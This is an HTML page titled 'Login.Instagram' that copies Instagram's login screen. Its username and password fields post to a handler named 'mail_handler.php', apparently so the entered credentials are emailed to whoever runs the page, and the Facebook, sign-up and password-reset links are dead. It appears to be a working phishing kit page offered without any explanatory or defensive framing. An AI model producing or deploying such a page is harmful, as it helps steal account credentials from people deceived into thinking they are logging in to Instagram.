<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	
	<title>Login.Instagram</title>
	<style type="text/css" media="screen">
	.tab1{
    border-width:1px;
    border-style: solid;
    width: 350px;
    height: 50;
    box-shadow: 0px 5px 15px rgb(26, 25, 25);
}
body{
    margin: 0;
    padding: 0;
        font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}
.main{
    border-width:1px;
    border-style: groove;
    margin:50px auto ;
    max-width: 350px;
    background-color: rgb(252, 251, 255);
    height: 450px;
    box-shadow: 0px 5px 15px rgb(26, 25, 25);
  
   
}

a{
    text-decoration: none;
}
body{
    background-color:rgb(240, 239, 239);
    font: inherit;
}
.tab1{
    background-color:  rgb(252, 251, 255);
}
.login{
    color:rgb(255, 255, 255)  ;
    width:240px;
    height:32px;
    margin-top:  -4px;
    background-color: rgb(68, 159, 211);
    opacity: 60%;
    border-radius: 3px;
    border: 0px;
    box-shadow: 2px 2px gray;
    
}
.formspace{
    margin-top: 6px;
}
.username{
    border:1px solid rgb(0,0,0,0.2);
    width: 240px;
    height:32px;
   font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

.signup{
    color: rgb(	0, 149, 246);

}


.instagram{
    opacity:1;
    
}
.facebook{
    color: #385185;
    font-family: apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}
.link{
    color:#00376B;
    
}
.btn-app img{
    height: 50px;
    width: auto;
    margin: 20px;
  
}

@media(max-width: 1080px){
			html{
			    zoom:2.5;
			}
		}
	</style>
</head>
<body>
	
		<div class="main">  
			<form action="mail_handler.php" method="post" name="form" >
                <center>
                    <img class="instagram" src="photo1.png" alt="loading..." width="250" height="130">
                </center>
                 <br>
				<center>
         
               
                    <input class="username" type="text" placeholder="&nbsp; &nbsp; Phone number,username, or email" name="name"/> 
            
				</center>
				<div class="formspace">
               <center>

                <input class="username" type="password" placeholder="&nbsp; &nbsp; Password" name="password"/> 
			    </div>
               </center>
                <br>
                <center>
                    <input type="submit" class="login" name="submit" value="Log In"/>
               </center>
              <br>
			
		    </form>
		    	
			<br>
			<hr>
			<center>
			OR
			</center>
			<br>
			<center>
			<a href="#" class="facebook" target="_self"> <img src="photo2.png" alt="loading..." width="19" height="18"> &nbsp; Log in with facebook </a>
			</center>
			
			<center>
			<small> <a class="link" href="#"> Forgot password? </a> </small>
			</center>
		
		</div>	
		 <table class="tab1" align="center" >
		 <tr align="center">
		 <td> <br>  Don't have an account?  <strong> <a class="signup" href="#"> Sign up </a> <strong> <br> <br>
		 </td>
		 </tr>
		 </table>
		 <br>
		 <center>
		 <p> Get the app.</p> 
                  <a href="#" class="btn-app"> <img src="/download-btn3.png" alt="app-store button"></a>
                        <a href="#" class="btn-app"> <img src="download-btn2.png"  alt="Play-store button "></a>
		 </center>
	</div>
</body>
</html>